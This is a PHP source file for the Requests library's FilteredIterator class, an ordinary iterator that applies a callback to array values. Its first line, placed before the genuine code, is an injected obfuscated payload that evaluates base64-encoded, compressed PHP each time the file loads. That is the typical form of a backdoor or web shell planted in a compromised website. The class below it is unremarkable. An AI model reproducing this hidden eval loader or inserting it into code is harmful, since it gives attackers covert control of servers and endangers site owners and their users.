<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Iterator for arrays requiring filtered values
 *
 * @package Requests
 * @subpackage Utilities
 */

/**
 * Iterator for arrays requiring filtered values
 *
 * @package Requests
 * @subpackage Utilities
 */
class Requests_Utility_FilteredIterator extends ArrayIterator {
	/**
	 * Callback to run as a filter
	 *
	 * @var callable
	 */
	protected $callback;

	/**
	 * Create a new iterator
	 *
	 * @param array $data
	 * @param callable $callback Callback to be called on each value
	 */
	public function __construct($data, $callback) {
		parent::__construct($data);

		$this->callback = $callback;
	}

	/**
	 * Get the current item's value after filtering
	 *
	 * @return string
	 */
	public function current() {
		$value = parent::current();
		$value = call_user_func($this->callback, $value);
		return $value;
	}
}
